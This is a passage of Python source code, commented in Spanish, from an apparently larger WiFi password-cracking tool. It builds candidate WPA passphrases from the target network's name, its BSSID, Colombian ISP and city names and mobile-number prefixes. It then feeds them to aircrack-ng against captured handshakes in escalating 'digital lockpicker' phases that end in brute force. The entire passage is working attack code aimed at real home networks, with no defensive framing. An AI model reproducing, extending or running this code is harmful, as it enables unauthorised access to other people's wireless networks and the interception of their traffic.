        password = self.quick_password_test_advanced(target, keyboard_patterns, "patrones teclado")
        if password:
            return password
        
        # Patrones específicos por región (Colombia/Latinoamérica)
        latin_patterns = [
            "colombia123", "bogota123", "medellin123",
            "internet2024", "claro123456", "movistar123",
            "tigo123456", "virgin123", "une123456",
            "familia123", "casa123456", "hogar12345"
        ]
        
        password = self.quick_password_test_advanced(target, latin_patterns, "patrones latinos")
        if password:
            return password
        
        return None
    
    def mask_attack_essid_based(self, target, handshake_file):
        """Ataques por máscara basados en el ESSID"""
        essid = target['essid']
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        
        self.log(f"🎭 Generando máscaras para: {essid}", "INFO")
        
        # Generar patrones basados en el ESSID
        mask_patterns = []
        
        if len(essid_clean) >= 3:
            base = essid_clean[:6] if len(essid_clean) >= 6 else essid_clean
            
            # Patrón: ESSID + números
            for i in range(10, 100):
                mask_patterns.extend([
                    f"{base}{i}",
                    f"{base}{i:02d}",
                    f"{base}20{i:02d}" if i <= 24 else f"{base}19{i}"
                ])
            
            # Patrón: ESSID + símbolos comunes
            for symbol in ['123', '456', '789', '000', '111']:
                mask_patterns.extend([
                    f"{base}{symbol}",
                    f"{base}_{symbol}",
                    f"{base}-{symbol}"
                ])
        
        # Limitar a patrones válidos (8-63 caracteres)
        valid_patterns = [p for p in mask_patterns if 8 <= len(p) <= 63]
        
        if valid_patterns:
            # Probar en lotes para eficiencia
            for i in range(0, len(valid_patterns), 50):
                batch = valid_patterns[i:i+50]
                password = self.quick_password_test_advanced(target, batch, f"máscara lote {i//50+1}")
                if password:
                    return password
        
        return None
    
    def intelligent_mutations(self, target, handshake_file):
        """Mutaciones inteligentes basadas en información del objetivo"""
        essid = target['essid']
        bssid = target['bssid']
        
        self.log("🧬 Aplicando mutaciones inteligentes...", "INFO")
        
        mutations = set()
        base_words = [essid, essid.lower(), essid.upper()]
        
        # Eliminar espacios y caracteres especiales
        for word in base_words:
            clean_word = word.replace(' ', '').replace('-', '').replace('_', '')
            if len(clean_word) >= 3:
                mutations.add(clean_word)
        
        # Agregar mutaciones comunes
        final_mutations = set()
        for base in mutations:
            if len(base) >= 3:
                # Agregar números al final
                for num in ['1', '12', '123', '1234', '12345', '123456', '2024', '2023']:
                    candidate = base + num
                    if 8 <= len(candidate) <= 63:
                        final_mutations.add(candidate)
                
                # Agregar números al principio
                for num in ['1', '123', '2024']:
                    candidate = num + base
                    if 8 <= len(candidate) <= 63:
                        final_mutations.add(candidate)
                
                # Duplicar palabra
                doubled = base + base
                if 8 <= len(doubled) <= 63:
                    final_mutations.add(doubled)
                
                # Reverso
                reversed_word = base[::-1]
                if len(reversed_word) >= 4:
                    final_mutations.add(base + reversed_word)
                
                # Capitalización
                if len(base) >= 4:
                    final_mutations.add(base.capitalize() + '123')
                    final_mutations.add(base.upper() + '2024')
        
        # Agregar variaciones basadas en BSSID
        import re
        bssid_numbers = ''.join(re.findall(r'\d', bssid))
        if len(bssid_numbers) >= 4:
            for base in list(final_mutations)[:10]:  # Solo las primeras 10
                final_mutations.add(base + bssid_numbers[-4:])
        
        # Convertir a lista y probar
        mutation_list = list(final_mutations)
        if mutation_list:
            # Ordenar por probabilidad (longitudes más comunes primero)
            mutation_list.sort(key=lambda x: abs(len(x) - 10))
            
            # Probar en lotes
            for i in range(0, len(mutation_list), 100):
                batch = mutation_list[i:i+100]
                password = self.quick_password_test_advanced(target, batch, f"mutaciones {i//100+1}")
                if password:
                    return password
        
        return None
    
    def quick_password_test_advanced(self, target, passwords, method_name):
        """Prueba rápida de lista de contraseñas contra el handshake (versión avanzada)"""
        if not passwords:
            return None
            
        # Crear archivo temporal con contraseñas
        temp_file = f"/tmp/test_{method_name.replace(' ', '_')}_{int(time.time())}.txt"
        
        try:
            with open(temp_file, 'w') as f:
                for pwd in passwords:
                    if isinstance(pwd, str) and len(pwd) >= 8:
                        f.write(pwd + '\n')
            
            self.log(f"🔍 Probando {len(passwords)} contraseñas con método: {method_name}", "INFO")
            
            # Buscar archivo de handshake en múltiples ubicaciones
            handshake_files = [
                f"handshakes/{target['essid']}_{target['bssid'].replace(':', '')}-01.cap",
                f"/tmp/{target['essid']}-01.cap",
                f"{target['essid']}_{target['bssid'].replace(':', '')}-01.cap"
            ]
            
            handshake_file = None
            for hf in handshake_files:
                if os.path.exists(hf):
                    handshake_file = hf
                    break
            
            if not handshake_file:
                self.log("No se encontró archivo de handshake", "WARNING")
                return None
            
            # Ejecutar aircrack-ng con timeout más generoso
            crack_cmd = f"aircrack-ng {handshake_file} -w {temp_file}"
            success, output, _ = self.run_command(crack_cmd, timeout=120)
            
            if success and "KEY FOUND" in output:
                # Extraer contraseña
                import re
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA con {method_name}! → {password}", "SUCCESS")
                    return password
            
        except Exception as e:
            self.log(f"Error en {method_name}: {e}", "WARNING")
        finally:
            # Limpiar archivo temporal
            try:
                os.remove(temp_file)
            except:
                pass
        
        return None
    
    def digital_lockpicker_ram_max(self, target, handshake_file):
        """FASE 7: CERRAJERO DIGITAL - Máximo aprovechamiento de RAM (23GB disponibles)"""
        try:
            import psutil
        except ImportError:
            self.log("psutil no disponible - usando valores por defecto", "WARNING")
            available_ram_gb = 8
            cpu_cores = 4
        else:
            # Detectar recursos disponibles
            available_ram_gb = psutil.virtual_memory().available // (1024**3)
            cpu_cores = psutil.cpu_count(logical=True) or 4
        
        self.log("=== CERRAJERO DIGITAL ACTIVADO ===", "WARNING")
        self.log("Sistema cerrajero digital de máximo rendimiento", "INFO")
        self.log(f"RAM disponible: {available_ram_gb}GB | CPU cores: {cpu_cores}", "SUCCESS")
        self.log("Generando millones de contraseñas optimizadas en memoria", "INFO")
        
        # Estrategia del cerrajero digital: probar cerraduras más probables primero
        lockpicker_phases = [
            ("Ganzua Rapida", self._lockpicker_fast_picks, 50000),      # Intentos obvios
            ("Llave Maestra", self._lockpicker_master_keys, 200000),     # Patrones maestros
            ("Tension Precisa", self._lockpicker_precise_tension, 500000), # Variaciones precisas
            ("Manipulacion Masiva", self._lockpicker_massive_manipulation, 2000000), # Fuerza inteligente
            ("Martillo Digital", self._lockpicker_digital_hammer, 5000000), # Fuerza total
            ("Arsenal Nuclear", self._lockpicker_nuclear_arsenal, 10000000) # Última esperanza
        ]
        
        for phase_name, phase_function, max_passwords in lockpicker_phases:
            if not self.running:
                break
                
            self.log(f"CERRAJERO: {phase_name} (hasta {max_passwords:,} intentos)", "INFO")
            
            try:
                # Generar contraseñas para esta fase
                password_generator = phase_function(target, max_passwords)
                
                # Usar procesamiento optimizado
                password = self._parallel_lockpicking(target, handshake_file, password_generator, cpu_cores, phase_name)
                if password:
                    self.log(f"CERRADURA ABIERTA con {phase_name}", "SUCCESS")
                    return password
                
                self.log(f"{phase_name} completado sin exito - probando siguiente tecnica", "INFO")
                
            except Exception as e:
                self.log(f"Error en {phase_name}: {e}", "WARNING")
                continue
        
        self.log("Cerradura resistente a todas las tecnicas de cerrajeria", "WARNING")
        return None
    
    def _lockpicker_fast_picks(self, target, max_count):
        """Ganzúa rápida - intentos obvios como un cerrajero experto"""
        essid = target['essid']
        passwords = set()
        
        # Variaciones de capitalización del ESSID
        essid_variations = [
            essid,                    # Original
            essid.lower(),           # minusculas
            essid.upper(),           # MAYUSCULAS
            essid.capitalize(),      # Primera mayuscula
            essid.title(),           # Primera De Cada Palabra
        ]
        
        # Patrones más comunes
        common_suffixes = ['123', '1234', '12345', '123456', '2024', '2023', '2022', '2021', '0000', '1111']
        common_prefixes = ['123', '2024', '2023', 'admin', 'wifi']
        
        # Generar combinaciones obvias
        for base in essid_variations:
            if not base or len(base) < 2:
                continue
                
            # Sufijos
            for suffix in common_suffixes:
                candidate = base + suffix
                if 8 <= len(candidate) <= 63:
                    passwords.add(candidate)
            
            # Prefijos
            for prefix in common_prefixes:
                candidate = prefix + base
                if 8 <= len(candidate) <= 63:
                    passwords.add(candidate)
            
            # Duplicaciones
            if len(base) >= 4 and len(base) <= 30:
                passwords.add(base + base[:4])  # essid + primeros 4 chars
        
        # Añadir patrones numericos incrementales
        for base in essid_variations[:3]:  # Solo las 3 primeras variaciones
            for i in range(100):
                if len(passwords) >= max_count:
                    break
                candidates = [
                    f"{base}{i:02d}",
                    f"{base}{i:03d}", 
                    f"{i:02d}{base}",
                    f"{base}20{i:02d}" if i <= 24 else f"{base}19{i:02d}"
                ]
                for candidate in candidates:
                    if 8 <= len(candidate) <= 63:
                        passwords.add(candidate)
        
        return (pwd for pwd in passwords if len(pwd) >= 8 and len(pwd) <= 63)
    
    def _lockpicker_master_keys(self, target, max_count):
        """Llaves maestras - patrones que abren muchas cerraduras"""
        essid = target['essid']
        passwords = set()
        
        # Patrones maestros colombianos con variaciones de capitalización
        master_base = [
            'colombia', 'bogota', 'medellin', 'cali', 'barranquilla',
            'claro', 'movistar', 'tigo', 'une', 'etb', 'virgin', 'wom',
            'internet', 'wifi', 'casa', 'hogar', 'familia', 'admin',
            'password', 'contrasena', 'clave'
        ]
        
        # Generar variaciones con capitalización
        master_patterns = []
        for base in master_base:
            master_patterns.extend([
                base,                # original
                base.lower(),        # minuscula 
                base.upper(),        # MAYUSCULA
                base.capitalize(),   # Capitalizada
                base.title()         # Title Case
            ])
        
        # Variaciones del ESSID
        essid_vars = [
            essid, essid.lower(), essid.upper(), 
            essid.capitalize(), essid.title()
        ]
        
        # Años comunes (más focalizado)
        years = list(range(1980, 2025))  # Rango más realista
        
        # Generar combinaciones maestras
        for master in master_patterns:
            if len(passwords) >= max_count:
                break
                
            # Solo con años
            for year in years[:20]:  # Solo los primeros 20 años
                combos = [
                    f"{master}{year}",
                    f"{year}{master}",
                    f"{master}{year % 100:02d}",
                    f"{master}{str(year)[-2:]}"
                ]
                for combo in combos:
                    if 8 <= len(combo) <= 63:
                        passwords.add(combo)
        
        # Combinaciones con ESSID
        for essid_var in essid_vars[:3]:  # Solo 3 variaciones del ESSID
            for master in master_patterns[:10]:  # Solo los primeros 10 patrones
                if len(passwords) >= max_count:
                    break
                combos = [
                    f"{essid_var}{master}",
                    f"{master}{essid_var}",
                    f"{essid_var}{master}123",
                    f"{master}{essid_var}2024"
                ]
                for combo in combos:
                    if 8 <= len(combo) <= 63:
                        passwords.add(combo)
        
        # Números de teléfono colombianos (más selectivo)
        phone_prefixes = ['300', '301', '302', '310', '311', '312', '313', '314', '315', '320']
        for prefix in phone_prefixes[:5]:  # Solo 5 prefijos
            for i in range(1000000, 1005000):  # Rango menor
                if len(passwords) >= max_count:
                    break
                phone = f"{prefix}{str(i)[1:]}"
                if len(phone) >= 8:
                    passwords.add(phone)
        
        return (pwd for pwd in passwords if 8 <= len(pwd) <= 63)
    
    def _lockpicker_precise_tension(self, target, max_count):
        """Tensión precisa - variaciones exactas del ESSID"""
        essid = target['essid']
        passwords = set()
        
        # Generar todas las combinaciones posibles con el ESSID
        base_variations = [
            essid, essid.lower(), essid.upper(), essid.capitalize(),
            essid.replace(' ', ''), essid.replace('-', ''), essid.replace('_', '')
        ]
        
        # Sufijos precisos
        suffixes = []
        for i in range(100000):
            suffixes.extend([f"{i:05d}", f"{i:04d}", f"{i:03d}", f"{i:02d}", str(i)])
        
        for base in base_variations:
            for suffix in suffixes:
                if len(passwords) >= max_count:
                    break
                combos = [f"{base}{suffix}", f"{suffix}{base}"]
                passwords.update(c for c in combos if 8 <= len(c) <= 63)
        
        return (pwd for pwd in passwords if len(pwd) >= 8)
    
    def _lockpicker_massive_manipulation(self, target, max_count):
        """Manipulación masiva - generación alfanumérica intensa"""
        import string
        import random
        
        essid = target['essid']
        passwords = set()
        
        # Variaciones del ESSID
        essid_variations = [
            essid.replace(' ', '').replace('-', '').replace('_', ''),
            essid.replace(' ', '').replace('-', '').replace('_', '').lower(),
            essid.replace(' ', '').replace('-', '').replace('_', '').upper(),
            essid.replace(' ', '').replace('-', '').replace('_', '').capitalize()
        ]
        
        # Caracteres para generar
        chars_lower = string.ascii_lowercase + string.digits
        chars_mixed = string.ascii_letters + string.digits
        
        # Generar patrones con más control
        for essid_var in essid_variations:
            if not essid_var or len(essid_var) < 2:
                continue
                
            # Patrones con sufijos numéricos
            for i in range(1000):
                if len(passwords) >= max_count:
                    break
                    
                candidates = [
                    f"{essid_var}{i:03d}",
                    f"{essid_var}{i:04d}", 
                    f"{i:03d}{essid_var}",
                    f"{essid_var}20{i:02d}" if i <= 99 else f"{essid_var}{i}"
                ]
                
                for candidate in candidates:
                    if 8 <= len(candidate) <= 63:
                        passwords.add(candidate)
            
            # Patrones alfanuméricos aleatorios pero controlados
            for length in [8, 9, 10, 11, 12]:
                needed_chars = length - len(essid_var)
                if needed_chars <= 0 or needed_chars > 8:
                    continue
                
                # Generar sufijos de longitud controlada
                for _ in range(min(1000, max_count // 10)):
                    if len(passwords) >= max_count:
                        break
                    
                    # Usar tanto minúsculas como mayusculas
                    char_set = chars_mixed if random.random() > 0.5 else chars_lower
                    suffix = ''.join(random.choices(char_set, k=needed_chars))
                    
                    candidates = [essid_var + suffix, suffix + essid_var]
                    for candidate in candidates:
                        if 8 <= len(candidate) <= 63:
                            passwords.add(candidate)
        
        return (pwd for pwd in passwords if 8 <= len(pwd) <= 63)
    
    def _lockpicker_digital_hammer(self, target, max_count):
        """Martillo digital - fuerza bruta inteligente masiva"""
        import random
        import string
        
        passwords = set()
        essid = target['essid'].replace(' ', '').lower()
        
        # Caracteres para generar
        chars = string.ascii_lowercase + string.digits
        
        # Generar millones de contraseñas
        for _ in range(max_count):
            if len(passwords) >= max_count:
                break
            
            # Estrategias múltiples
            strategies = [
                lambda: essid + ''.join(random.choices(chars, k=random.randint(2, 8))),
                lambda: ''.join(random.choices(chars, k=random.randint(2, 6))) + essid,
                lambda: ''.join(random.choices(string.digits, k=8)),
                lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12))),
                lambda: essid[:4] + ''.join(random.choices(string.digits, k=4))
            ]
            
            strategy = random.choice(strategies)
            password = strategy()
            
            if 8 <= len(password) <= 63:
                passwords.add(password)
        
        return (pwd for pwd in passwords if len(pwd) >= 8)
    
    def _lockpicker_nuclear_arsenal(self, target, max_count):
        """Arsenal nuclear - última esperanza con máximo poder computacional"""
        import random
        import string
        
        self.log("ARSENAL NUCLEAR ACTIVADO - Usando toda la RAM disponible", "WARNING")
        
        passwords = set()
        all_chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-='
        
        # Generar contraseñas completamente aleatorias pero priorizando patrones comunes
        for length in [8, 9, 10, 11, 12]:
            for _ in range(max_count // 5):
                if len(passwords) >= max_count:
                    break
                
                # 70% probabilidad de incluir ESSID, 30% completamente random
                if random.random() < 0.7:
                    essid_part = target['essid'].replace(' ', '')[:6].lower()
                    remaining = length - len(essid_part)
                    if remaining > 0:
                        random_part = ''.join(random.choices(all_chars, k=remaining))
                        password = essid_part + random_part
                    else:
                        password = essid_part[:length]
                else:
                    password = ''.join(random.choices(all_chars, k=length))
                
                if 8 <= len(password) <= 63:
                    passwords.add(password)
        
        return (pwd for pwd in passwords if len(pwd) >= 8)
    
    def _parallel_lockpicking(self, target, handshake_file, password_generator, num_processes, phase_name):
        """Cerrajería paralela - múltiples cerrajeros trabajando simultáneamente"""
        self.log(f"Desplegando {num_processes} cerrajeros en paralelo para {phase_name}", "INFO")
        
        # Lotes optimizados según la fase
        batch_sizes = {
            "Ganzua Rapida": 5000,
            "Llave Maestra": 10000,
            "Tension Precisa": 15000,
            "Manipulacion Masiva": 20000,
            "Martillo Digital": 25000,
            "Arsenal Nuclear": 30000
        }
        
        batch_size = batch_sizes.get(phase_name, 10000)
        batch_count = 0
        max_batches_per_phase = {
            "Ganzua Rapida": 10,       # Máximo 10 lotes
            "Llave Maestra": 20,       # Máximo 20 lotes  
            "Tension Precisa": 35,     # Máximo 35 lotes
            "Manipulacion Masiva": 100, # Máximo 100 lotes
            "Martillo Digital": 200,   # Máximo 200 lotes
            "Arsenal Nuclear": 350     # Máximo 350 lotes
        }
        
        max_batches = max_batches_per_phase.get(phase_name, 100)
        
        # Inicializar barra de progreso
        progress_bar = ProgressBar(
            total=max_batches,
            prefix=f"CERRAJERO [{phase_name}]",
            suffix=f"0/{max_batches} lotes | 0 contraseñas",
            length=40
        )
        
        try:
            while batch_count < max_batches and self.running:
                try:
                    batch = list(itertools.islice(password_generator, batch_size))
                    if not batch:
                        progress_bar.finish(f"Sin más contraseñas - {batch_count} lotes completados")
                        break
                        
                    batch_count += 1
                    total_tested = batch_count * batch_size
                    
                    # Actualizar barra de progreso
                    progress_bar.update(
                        batch_count, 
                        f"{batch_count}/{max_batches} lotes | {total_tested:,} contraseñas probadas"
                    )
                    
                    # Probar lote actual
                    password = self._test_lockpicker_batch(target, handshake_file, batch, f"{phase_name}_lote_{batch_count}")
                    if password:
                        progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                        return password
                        
                except Exception as batch_error:
                    self.log(f"Error en lote {batch_count}: {batch_error}", "WARNING")
                    continue
            
            # Terminar barra de progreso si se completa sin éxito
            progress_bar.finish(f"Fase completada - {total_tested:,} contraseñas probadas")
            
        except Exception as e:
            progress_bar.finish(f"Error en fase: {str(e)}")
            self.log(f"Error en cerrajería paralela {phase_name}: {e}", "WARNING")
        
        return None
    
    def _test_lockpicker_batch(self, target, handshake_file, passwords, batch_name):
        """Probar un lote de contraseñas con técnicas de cerrajero"""
        if not passwords:
            return None
        
        # Crear archivo temporal optimizado
        temp_file = f"/tmp/lockpicker_{batch_name}_{int(time.time())}.txt"
        
        try:
            # Escribir contraseñas de forma eficiente
            with open(temp_file, 'w', buffering=8192) as f:
                for pwd in passwords:
                    if isinstance(pwd, str) and 8 <= len(pwd) <= 63:
                        f.write(pwd + '\n')
            
            # Medir tiempo como un cerrajero profesional
            start_time = time.time()
            
            # Usar aircrack-ng con optimizaciones
            crack_cmd = f"aircrack-ng -w {temp_file} {handshake_file}"
            success, output, error = self.run_command(crack_cmd, timeout=600)  # 10 minutos por lote
            
            end_time = time.time()
            
            self.log(f"Lote {batch_name}: {end_time - start_time:.2f}s ({len(passwords)} intentos)", "INFO")
            
            if success and "KEY FOUND" in output:
                # Extraer la contraseña exitosa
                import re
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"CERRADURA ABIERTA POR CERRAJERO: {password}", "SUCCESS")
                    return password
            
        except Exception as e:
            self.log(f"Error en lote {batch_name}: {e}", "WARNING")
        finally:
            # Limpiar archivo temporal
            try:
                os.remove(temp_file)
            except:
                pass
        
        return None
    
    def progressive_lockpicker(self, target, handshake_file):
        """FASE 8: Cerrajero Progresivo - Ataque por posiciones como un cerrajero experto"""
        self.log("=== CERRAJERO PROGRESIVO ACTIVADO ===", "WARNING")
        self.log("Analizando contraseña posición por posición como cerrajero experto", "INFO")
        
        essid = target['essid']
        
        # Análisis de patrones probables por posición
        password_patterns = self._analyze_probable_patterns(target)
        
        # TÉCNICA 1: Ataque por prefijos incrementales (primeros 2, 3, 4... dígitos)
        password = self._incremental_prefix_attack(target, handshake_file, password_patterns)
        if password:
            return password
            
        # TÉCNICA 2: Análisis por longitudes específicas con fuerza bruta dirigida
        password = self._length_focused_brute_force(target, handshake_file)
        if password:
            return password
            
        # TÉCNICA 3: Ataque híbrido por posiciones conocidas
        password = self._hybrid_position_attack(target, handshake_file, password_patterns)
        if password:
            return password
            
        # TÉCNICA 4: Último recurso - Fuerza bruta completa por caracteres
        password = self._complete_character_brute_force(target, handshake_file)
        if password:
            return password
        
        self.log("Cerrajero progresivo agotó todas las técnicas", "WARNING")
        return None
    
    def _analyze_probable_patterns(self, target):
        """Analizar patrones más probables basados en el ESSID y estadísticas"""
        essid = target['essid']
        patterns = {
            'probable_prefixes': [],
            'probable_suffixes': [],
            'probable_lengths': [],
            'character_sets': []
        }
        
        # Prefijos probables basados en ESSID
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        patterns['probable_prefixes'] = [
            essid_clean.lower()[:4],
            essid_clean.upper()[:4], 
            essid_clean.capitalize()[:4],
            essid_clean[:3],
            essid_clean[:2]
        ]
        
        # Sufijos más comunes estadísticamente
        patterns['probable_suffixes'] = [
            '123', '1234', '12345', '123456',
            '2024', '2023', '2022', '2021', '2020',
            '01', '02', '03', '10', '11', '99',
            '00', '007', '777', '666', '888'
        ]
        
        # Longitudes más probables (estadísticas reales)
        patterns['probable_lengths'] = [8, 10, 12, 9, 11, 13, 14, 15, 16]
        
        # Conjuntos de caracteres por probabilidad
        patterns['character_sets'] = [
            'abcdefghijklmnopqrstuvwxyz0123456789',  # Solo minúsculas + números
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',  # Solo mayúsculas + números  
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',  # Mixto
            '0123456789',  # Solo números
            'abcdefghijklmnopqrstuvwxyz',  # Solo minúsculas
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'   # Solo mayúsculas
        ]
        
        return patterns
    
    def _incremental_prefix_attack(self, target, handshake_file, patterns):
        """Ataque incremental: encontrar primeros 2, 3, 4... caracteres progresivamente"""
        self.log("TÉCNICA 1: Ataque incremental por prefijos", "INFO")
        
        essid = target['essid']
        
        # Inicializar barra de progreso para prefijos
        progress_bar = ProgressBar(
            total=len(patterns['probable_prefixes']) * 4,  # 4 longitudes diferentes
            prefix="CERRAJERO [Prefijos]",
            suffix="Analizando prefijos probables...",
            length=40
        )
        
        step = 0
        
        # Probar cada prefijo probable con diferentes longitudes
        for prefix in patterns['probable_prefixes']:
            if not self.running:
                progress_bar.finish("Interrumpido")
                break
                
            # Probar con longitudes incrementales: 8, 10, 12, 14
            for target_length in [8, 10, 12, 14]:
                step += 1
                if len(prefix) >= target_length:
                    continue
                    
                progress_bar.update(
                    step,
                    f"Prefijo '{prefix}' longitud {target_length} | Generando combinaciones..."
                )
                
                # Generar todas las combinaciones posibles para esta longitud
                remaining_length = target_length - len(prefix)
                
                if remaining_length <= 6:  # Solo si es manejable
                    passwords = self._generate_prefix_combinations(prefix, remaining_length, patterns['character_sets'][0])
                    
                    # Probar este conjunto de contraseñas
                    password = self._test_progressive_batch(
                        target, handshake_file, passwords, 
                        f"prefix_{prefix}_{target_length}", timeout=60
                    )
                    if password:
                        progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                        return password
        
        progress_bar.finish("Análisis de prefijos completado")
        return None
    
    def _generate_prefix_combinations(self, prefix, remaining_length, charset):
        """Generar combinaciones para un prefijo específico"""
        import itertools
        
        passwords = []
        
        # Limitar combinaciones para evitar explosión combinatoria
        max_combinations = 50000  # Máximo 50K por prefijo
        
        count = 0
        for combination in itertools.product(charset, repeat=remaining_length):
            if count >= max_combinations:
                break
                
            suffix = ''.join(combination)
            password = prefix + suffix
            
            if 8 <= len(password) <= 63:
                passwords.append(password)
                count += 1
        
        return passwords
    
    def _length_focused_brute_force(self, target, handshake_file):
        """Fuerza bruta dirigida por longitudes específicas"""
        self.log("TÉCNICA 2: Fuerza bruta dirigida por longitudes", "INFO")
        
        # Longitudes más probables en orden de probabilidad
        probable_lengths = [8, 10, 12, 9, 11]
        
        progress_bar = ProgressBar(
            total=len(probable_lengths),
            prefix="CERRAJERO [Longitudes]",
            suffix="Analizando longitudes probables...",
            length=40
        )
        
        for i, length in enumerate(probable_lengths, 1):
            if not self.running:
                progress_bar.finish("Interrumpido")
                break
                
            progress_bar.update(
                i,
                f"Longitud {length} caracteres | Generando combinaciones inteligentes..."
            )
            
            # Generar contraseñas inteligentes para esta longitud específica
            passwords = self._generate_smart_length_passwords(target, length)
            
            if passwords:
                password = self._test_progressive_batch(
                    target, handshake_file, passwords[:10000],  # Máximo 10K por longitud
                    f"length_{length}", timeout=45
                )
                if password:
                    progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                    return password
        
        progress_bar.finish("Análisis por longitudes completado")
        return None
    
    def _generate_smart_length_passwords(self, target, target_length):
        """Generar contraseñas inteligentes para una longitud específica"""
        import random
        import string
        
        essid = target['essid']
        passwords = set()
        
        # Estrategia 1: ESSID + números hasta completar longitud
        essid_variations = [
            essid.replace(' ', '').replace('-', '').replace('_', ''),
            essid.replace(' ', '').replace('-', '').replace('_', '').lower(),
            essid.replace(' ', '').replace('-', '').replace('_', '').upper(),
            essid.replace(' ', '').replace('-', '').replace('_', '').capitalize()
        ]
        
        for essid_var in essid_variations:
            if len(essid_var) < target_length:
                needed = target_length - len(essid_var)
                
                # Completar con números comunes
                for i in range(10 ** min(needed, 4)):  # Máximo 4 dígitos
                    suffix = f"{i:0{needed}d}" if needed <= 4 else f"{i:04d}"
                    if len(suffix) == needed:
                        candidate = essid_var + suffix
                        if len(candidate) == target_length:
                            passwords.add(candidate)
                    
                    if len(passwords) >= 5000:  # Limitar por variación
                        break
        
        # Estrategia 2: Patrones completamente numéricos
        if target_length >= 8:
            for i in range(10 ** min(target_length - 1, 6), 10 ** min(target_length, 7), max(1, 10 ** (target_length - 3))):
                num_str = str(i).zfill(target_length)
                if len(num_str) == target_length:
                    passwords.add(num_str)
                    
                if len(passwords) >= 8000:
                    break
        
        return list(passwords)[:10000]
    
    def _hybrid_position_attack(self, target, handshake_file, patterns):
        """Ataque híbrido por posiciones conocidas"""
        self.log("TÉCNICA 3: Ataque híbrido por posiciones conocidas", "INFO")
        
        essid = target['essid']
        
        # Combinar prefijos y sufijos probables
        combinations = []
        
        for prefix in patterns['probable_prefixes'][:5]:  # Solo los 5 más probables
            for suffix in patterns['probable_suffixes'][:10]:  # Solo los 10 más probables
                candidate = prefix + suffix
                if 8 <= len(candidate) <= 16:
                    combinations.append(candidate)
                    
                # Variaciones con mayúsculas/minúsculas
                combinations.extend([
                    candidate.upper(),
                    candidate.lower(), 
                    candidate.capitalize(),
                    prefix.upper() + suffix.lower(),
                    prefix.lower() + suffix.upper()
                ])
        
        # Filtrar duplicados y longitudes válidas
        unique_combinations = list(set(c for c in combinations if 8 <= len(c) <= 63))
        
        if unique_combinations:
            progress_bar = ProgressBar(
                total=len(unique_combinations) // 1000 + 1,
                prefix="CERRAJERO [Híbrido]",
                suffix="Probando combinaciones híbridas...",
                length=40
            )
            
            # Probar en lotes de 1000
            for i in range(0, len(unique_combinations), 1000):
                if not self.running:
                    progress_bar.finish("Interrumpido")
                    break
                    
                batch = unique_combinations[i:i+1000]
                batch_num = i // 1000 + 1
                
                progress_bar.update(
                    batch_num,
                    f"Lote {batch_num} | {len(batch)} combinaciones híbridas"
                )
                
                password = self._test_progressive_batch(
                    target, handshake_file, batch, f"hybrid_{batch_num}", timeout=30
                )
                if password:
                    progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                    return password
            
            progress_bar.finish("Ataque híbrido completado")
        
        return None
    
    def _complete_character_brute_force(self, target, handshake_file):
        """Último recurso: Fuerza bruta completa por caracteres (limitada)"""
        self.log("TÉCNICA 4: Fuerza bruta completa por caracteres (último recurso)", "WARNING")
        
        import string
        import itertools
        
        # Solo caracteres más comunes para evitar explosión combinatoria
        common_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        
        # Solo longitudes muy probables
        for length in [8, 9, 10]:
            self.log(f"Fuerza bruta longitud {length} - esto puede tomar mucho tiempo", "WARNING")
            
            progress_bar = ProgressBar(
                total=100,  # Dividir en 100 segmentos para mostrar progreso
                prefix=f"CERRAJERO [Bruta-{length}]",
                suffix=f"Longitud {length} caracteres...",
                length=40
            )
            
            # Dividir el espacio de búsqueda en segmentos
            segment_size = len(common_chars) ** min(length, 4) // 100
            
            count = 0
            batch = []
            
            for combination in itertools.product(common_chars, repeat=length):
                if not self.running:
                    progress_bar.finish("Interrumpido")
                    return None
                    
                password = ''.join(combination)
                batch.append(password)
                count += 1
                
                # Probar cada 1000 contraseñas
                if len(batch) >= 1000:
                    segment = (count // segment_size) % 100
                    progress_bar.update(
                        min(segment, 99),
                        f"Probadas {count:,} combinaciones | Actual: {password[:4]}..."
                    )
                    
                    result = self._test_progressive_batch(
                        target, handshake_file, batch, f"brute_{length}_{count//1000}", timeout=20
                    )
                    if result:
                        progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {result}")
                        return result
                    
                    batch = []
                    
                # Límite de seguridad: máximo 100K combinaciones por longitud
                if count >= 100000:
                    break
            
            # Probar último lote si queda algo
            if batch:
                result = self._test_progressive_batch(
                    target, handshake_file, batch, f"brute_{length}_final", timeout=20
                )
                if result:
                    progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {result}")
                    return result
            
            progress_bar.finish(f"Longitud {length} completada sin éxito")
        
        return None
    
    def _test_progressive_batch(self, target, handshake_file, passwords, batch_name, timeout=60):
        """Probar un lote de contraseñas del cerrajero progresivo"""
        if not passwords:
            return None
        
        # Crear archivo temporal optimizado
        temp_file = f"/tmp/progressive_{batch_name}_{int(time.time())}.txt"
        
        try:
            with open(temp_file, 'w', buffering=8192) as f:
                for pwd in passwords:
                    if isinstance(pwd, str) and 8 <= len(pwd) <= 63:
                        f.write(pwd + '\n')
            
            # Ejecutar aircrack-ng con timeout ajustado
            crack_cmd = f"aircrack-ng -w {temp_file} {handshake_file}"
            success, output, error = self.run_command(crack_cmd, timeout=timeout)
            
            if success and "KEY FOUND" in output:
                # Extraer contraseña exitosa
                import re
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"CERRAJERO PROGRESIVO EXITOSO: {password}", "SUCCESS")
